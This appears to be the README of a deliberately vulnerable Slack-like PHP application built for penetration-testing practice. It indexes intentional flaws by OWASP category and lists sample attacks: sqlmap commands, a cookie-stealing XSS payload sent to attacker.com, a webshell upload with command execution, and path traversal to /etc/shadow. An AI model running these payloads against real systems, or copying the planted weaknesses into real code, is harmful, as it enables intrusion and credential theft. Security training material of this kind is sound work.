# Slack Clone - PHP Security Penetration Testing Testbed

A deliberately vulnerable Slack-like messaging application built with PHP, MySQL, and WebSockets (Ratchet). This application is intended **exclusively for penetration testing, security research, and education**.

> ⚠️ **WARNING: This application contains intentional security vulnerabilities. DO NOT deploy in a production environment or expose to the public internet.**

---

## Architecture

```
PHP 8.x + Ratchet WebSockets + MySQL 8 + Nginx
```

### Directory Structure

```
slack-clone/
├── index.php                 # Entry point / router
├── config/                   # App & DB configuration
├── includes/                 # Core PHP logic (auth, handlers)
├── api/v1/                   # REST API endpoints
├── api/internal/             # Unauthenticated internal endpoints
├── websocket/                # Ratchet WebSocket server
├── public/                   # Static assets + uploads
├── views/                    # PHP HTML templates
├── logs/                     # Application logs
├── docker/                   # Docker configuration
├── kubernetes/               # K8s manifests
└── sql/                      # Database schema
```

---

## Quick Start

### Option 1: Docker Compose

```bash
cd docker
docker-compose up --build
```

Access:
- Web UI: http://localhost
- WebSocket: ws://localhost:8080
- Admin: http://localhost:8081 (credentials: admin/admin)
- MySQL: localhost:3306

### Option 2: Local PHP Dev Server

```bash
# Install dependencies
composer install

# Initialize database
mysql -u root -p < sql/schema.sql

# Start WebSocket server (in background)
php websocket/server.php &

# Start PHP built-in server
php -S localhost:8000 index.php
```

---

## Vulnerability Index (OWASP Top 10 Mapping)

### A01 - Broken Access Control
| File | Vulnerability |
|------|--------------|
| `api/v1/messages/send.php` | IDOR: `user_id` from POST body |
| `api/v1/messages/delete.php` | IDOR: Any user deletes any message |
| `api/v1/files/download.php` | IDOR + Path Traversal |
| `api/v1/channels/join.php` | IDOR: Join any private channel |
| `api/v1/users/profile.php` | IDOR: View/edit any user's profile |
| `api/internal/` | No authentication required |

### A02 - Cryptographic Failures
| File | Vulnerability |
|------|--------------|
| `includes/auth.php` | MD5 password hashing |
| `includes/crypto.php` | Static IV, weak key, no HMAC |
| `config/config.php` | Hardcoded JWT secret (`secret123`) |
| `public/js/websocket.js` | Token in WebSocket URL (ws://) |
| `public/js/app.js` | Tokens stored in localStorage |

### A03 - Injection
| File | Vulnerability |
|------|--------------|
| `api/v1/auth/login.php` | SQLi via `loginUser()` |
| `includes/message_handler.php` | SQLi in `sendMessage()`, `getMessages()` |
| `includes/channel_handler.php` | SQLi in `createChannel()`, `getChannel()` |
| `includes/user_handler.php` | SQLi in `getUserProfile()`, `searchUsers()` |
| `api/v1/users/search.php` | Reflected XSS + SQLi |
| `api/internal/admin.php` | RCE via `shell_exec()` |

### A04 - Insecure Design
| File | Vulnerability |
|------|--------------|
| `websocket/Chat.php` | No origin validation, IDOR via payload |
| `includes/file_handler.php` | Unrestricted upload (php5/phtml) |
| `api/v1/files/upload.php` | RCE via file upload to web root |

### A05 - Security Misconfiguration
| File | Vulnerability |
|------|--------------|
| `.htaccess` | Directory listing enabled (`Options +Indexes`) |
| `config/config.php` | Debug mode on, PHP errors displayed |
| `docker/Dockerfile` | Runs as root, PHP errors enabled |
| `kubernetes/deployment.yaml` | Privileged container |

### A07 - Auth & Session Failures
| File | Vulnerability |
|------|--------------|
| `includes/session.php` | Session fixation, no `HttpOnly`/`Secure` |
| `api/v1/auth/login.php` | No rate limiting |
| `api/v1/auth/logout.php` | Token not revoked in DB |
| `includes/auth.php` | Timing attack in password comparison |

### A08 - Software & Data Integrity
| File | Vulnerability |
|------|--------------|
| `websocket/Chat.php` | Trusts `user_id` from WS payload |
| `api/v1/messages/send.php` | Trusts `user_id` from POST body |

---

## Testing Targets

### SQL Injection
```bash
# Login endpoint
sqlmap -u "http://localhost/api/v1/auth/login.php" \
  --data='{"username":"admin'\''","password":"x"}' \
  --headers="Content-Type: application/json" --level=5 --risk=3

# Message fetch
sqlmap -u "http://localhost/api/v1/messages/fetch.php?channel_id=1*" \
  --cookie="session_token=YOUR_TOKEN"
```

### XSS
```
# Stored XSS via message content
POST /api/v1/messages/send.php
{"channel_id": "1", "message": "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"}

# Reflected XSS via user search
GET /api/v1/users/search.php?q=<img+src=x+onerror=alert(1)>
```

### File Upload (RCE)
```bash
# Upload PHP webshell (rename .php to .php5 or .phtml)
curl -X POST http://localhost/api/v1/files/upload.php \
  -H "Authorization: Bearer TOKEN" \
  -F "file=@shell.phtml;type=image/jpeg"

# Execute via web
curl http://localhost/public/uploads/TIMESTAMP_shell.phtml?cmd=id
```

### Path Traversal / LFI
```
GET /api/v1/files/download.php?file_path=../../etc/passwd
GET /api/internal/logs.php?type=../../etc/shadow
```

### Session Fixation
```
GET /login?PHPSESSID=attacker_controlled_session_id
```

### WebSocket IDOR
```javascript
// Connect and spoof as another user
ws.send(JSON.stringify({action:'send', channel_id:'1', user_id:'VICTIM_USER_ID', content:'spoofed'}));
```

---

## Credentials

| Service | Username | Password |
|---------|----------|----------|
| Admin UI | admin | admin |
| MySQL root | root | root |
| MySQL app user | slackuser | slackpass |

---

## Legal Notice

This software is provided for **educational and authorized penetration testing purposes only**. Use of this software against systems without explicit written permission is illegal. The authors are not responsible for misuse.
